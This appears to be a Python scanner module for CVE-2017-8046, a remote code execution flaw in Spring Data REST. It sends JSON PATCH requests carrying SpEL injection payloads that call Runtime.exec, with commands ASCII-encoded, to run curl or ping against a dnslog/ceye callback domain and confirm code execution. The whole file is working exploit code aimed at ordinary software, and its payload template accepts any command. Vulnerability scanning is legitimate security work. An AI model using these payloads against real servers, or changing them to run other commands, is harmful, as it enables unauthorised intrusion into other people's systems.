#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cve_2017_8046_payloads = [
    {   # * curl
        'path': '1',
        'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,117,114,108,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
    },
    {   # * ping -c 4
        'path': '1',
        'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{112,105,110,103,32,45,99,32,52,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
    },
    {   # * ping
        'path': '1',
        'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{112,105,110,103,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
    },
]

def cve_2017_8046_scan(clients):
    ''' 构造ASCII码的JSON数据包, 向spring-data-rest服务器提交恶意PATCH请求, 可以执行任意代码 '''
    client = clients.get('reqClient')
    sessid = '8d2aba535b132733b453254c40e50f95'
    
    vul_info = {
        'app_name': 'Spring',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2017-8046',
    }

    headers = {
        'Content-Type': 'application/json-patch+json'
    }

    # * 先使用POST请求添加一个对象, 防止目标不存在对象 导致漏洞利用失败
    res1 = client.request(
        'post',
        '',
        data='{}', 
        headers={'Content-Type': 'application/json'},
        allow_redirects=False,
        vul_info=vul_info
    )

    for payload in cve_2017_8046_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
        
        # ! 该漏洞的Payload需要转换成ASCII码, 以逗号分隔每一个字母的ASCII编码
        ascii_dns_domain = ''
        for b in dns_domain:
            ascii_dns_domain += str(ord(b)) + ','

        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', ascii_dns_domain[:-1])

        res2 = client.request(
            'patch',
            path,
            data=data, 
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res2 is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res2.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Encodeing': 'ASCII',
                'Request': res2,
            }
            return results
    return None
